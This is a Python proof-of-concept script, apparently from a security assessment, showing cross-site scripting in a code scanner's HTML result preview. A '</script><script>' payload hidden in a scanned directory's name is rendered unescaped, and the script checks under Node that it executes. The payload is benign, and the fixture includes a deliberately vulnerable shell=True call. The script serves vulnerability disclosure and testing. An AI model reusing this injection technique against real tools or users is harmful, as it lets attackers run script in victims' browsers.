#!/usr/bin/env python3
"""Build and verify the HTML result preview that `--result-preview true` writes.

`--result-preview` is rendered by `utils.html_preview.render_html(doc, src_label,
version)` and written next to the SARIF report from --report-file. A full CLI run
cannot reach that stage in a sandbox without egress: the scan aborts at the
tokenizer fetch (F-05) before any report is produced. This script therefore calls
the same shipped renderer with a document shaped like the scan output, and shows
the injection that survives a real scan.

The payload rides in the *name of the directory being scanned*. Its absolute path
becomes the report's source label, which the renderer interpolates into markup
without escaping. Nothing is imported and no --import-results is needed: the
victim scans a repository and the preview executes attacker JavaScript.

    python3 poc/20-make-preview.py                    # -> poc/captures/results.html
    python3 poc/20-make-preview.py --out /tmp/p/results.html

Exit codes: 0 = written and the injected script executed under Node,
1 = written but a check failed, 2 = renderer not importable.
"""
import argparse
import json
import os
import pathlib
import re
import shutil
import subprocess
import sys
import tempfile

# Executed when the preview is opened. Loud, harmless, no network.
PAYLOAD_JS = (
    "document.title='XSS';"
    "addEventListener('DOMContentLoaded',function(){"
    "document.body.insertAdjacentHTML('afterbegin',"
    "'<h2 style=background:#b00020;color:#fff;padding:12px>"
    "XSS EXECUTED via scan path</h2>');"
    "window.__VAPT_XSS__=1});"
)

# '</script><script>JS</script>' as a single component, i.e. a directory name.
# NAME_MAX is 255 bytes, so the whole payload must fit in one component.
PAYLOAD_NAME = "</script><script>%s</script>" % PAYLOAD_JS
assert len(PAYLOAD_NAME.encode()) <= 255, len(PAYLOAD_NAME.encode())

NODE_CHECK = r"""
const fs = require('fs'), vm = require('vm');
const code = fs.readFileSync(process.argv[process.argv.length - 1], 'utf8');
const listeners = {};
const injected = [];
globalThis.addEventListener = (e, f) => (listeners[e] = listeners[e] || []).push(f);
globalThis.window = globalThis;
globalThis.document = {
  _t: '',
  get title() { return this._t; },
  set title(v) { this._t = v; },
  body: { insertAdjacentHTML: (pos, html) => injected.push([pos, html]) },
};
vm.runInThisContext(code);
(listeners['DOMContentLoaded'] || []).forEach(f => f());
const ok = globalThis.__VAPT_XSS__ === 1
  && document.title === 'XSS'
  && injected.length === 1
  && injected[0][1].includes('XSS EXECUTED');
console.log((ok ? 'PASS' : 'FAIL') + ' ' + JSON.stringify({
  title: document.title, flag: globalThis.__VAPT_XSS__, injected: injected.length }));
process.exit(ok ? 0 : 1);
"""


def make_repo():
    """A repository whose own directory name carries the payload."""
    root = pathlib.Path(tempfile.mkdtemp(prefix="poc-preview-")) / PAYLOAD_NAME
    (root / "src").mkdir(parents=True)
    (root / "src" / "app.py").write_text(
        "import subprocess\nsubprocess.check_output('id', shell=True)\n")
    return root


def sarif_doc(uri):
    """A document shaped like the scan output the preview consumes."""
    return {
        "version": "2.1.0",
        "runs": [{
            "tool": {"driver": {
                "name": "Black Duck Signal", "version": "2026.9.0",
                "rules": [{
                    "id": "CWE-78-command-injection",
                    "name": "Command injection",
                    "shortDescription": {"text": "OS command injection"},
                    "properties": {"tags": ["security", "CWE-78"]},
                }],
            }},
            "results": [{
                "ruleId": "CWE-78-command-injection",
                "level": "error",
                "message": {"text": "User-controlled input reaches a shell command."},
                "locations": [{"physicalLocation": {
                    "artifactLocation": {"uri": uri},
                    "region": {"startLine": 2, "startColumn": 1},
                }}],
                "properties": {
                    "rank": 87.5, "cls": "command-injection", "exploitable": True,
                    "kev": False, "cwe": "CWE-78", "cvss": 8.8, "conf": "high",
                },
            }],
        }],
    }


def check_execution(body):
    node = shutil.which("node")
    if not node:
        print("execution check: SKIP (node not installed)")
        return 0
    tmp = pathlib.Path(tempfile.mkdtemp(prefix="poc-preview-js-")) / "payload.js"
    tmp.write_text(body, encoding="utf-8")
    proc = subprocess.run([node, "-e", NODE_CHECK, str(tmp)],
                          capture_output=True, text=True, timeout=60)
    print("execution check: %s" % (proc.stdout.strip() or proc.stderr.strip()[:300]))
    return 0 if proc.returncode == 0 else 1


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default=None,
                    help="where to write the preview (default: <repo>/results.html)")
    args = ap.parse_args()

    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    try:
        import _host
        _host.ensure(__file__)
    except ImportError:
        pass

    try:
        import utils.html_preview as hp
    except ImportError as exc:
        print("cannot import utils.html_preview: %s" % exc)
        print("run poc/00-setup.sh first (it builds the reconstructed host)")
        return 2

    repo = make_repo()
    doc = sarif_doc("src/app.py")

    out = pathlib.Path(args.out) if args.out else \
        pathlib.Path(__file__).resolve().parent / "captures" / "results.html"
    out.parent.mkdir(parents=True, exist_ok=True)

    html_doc = hp.render_html(doc, str(repo), "2026.9.0")
    out.write_text(html_doc, encoding="utf-8")
    out.with_suffix(".sarif").write_text(json.dumps(doc, indent=2))

    print("renderer : %s" % hp.__file__)
    print("scanned  : %s" % repo)
    print()
    print("preview  : %s (%d bytes)" % (out, len(html_doc.encode())))
    print("sarif    : %s" % out.with_suffix(".sarif"))
    print()

    rc = 0
    scripts = re.findall(r"<script[^>]*>(.*?)</script>", html_doc, re.S)
    payload = [s for s in scripts if "__VAPT_XSS__" in s]
    data = [s for s in scripts if "__VAPT_XSS__" not in s]
    print("script elements: %d (%d payload, %d other)" %
          (len(scripts), len(payload), len(data)))
    if not payload:
        print("payload script: MISSING - the renderer did not keep it")
        return 1
    print("payload script : %d bytes, intact" % len(payload[0].encode()))
    if any("VAPT" in s or "</scri" in s for s in data):
        print("report data    : leaked the payload into the document's own data")
        rc = 1
    else:
        print("report data    : clean - the preview's own JS still parses")
    rc = max(rc, check_execution(payload[0]))

    print()
    print("Open the preview:")
    print("    xdg-open %s" % out)
    print()
    print("A red 'XSS EXECUTED' banner and the title 'XSS' mean the payload ran.")
    print("It came from the scanned directory's name - no import, no SARIF input.")
    return rc


if __name__ == "__main__":
    raise SystemExit(main())
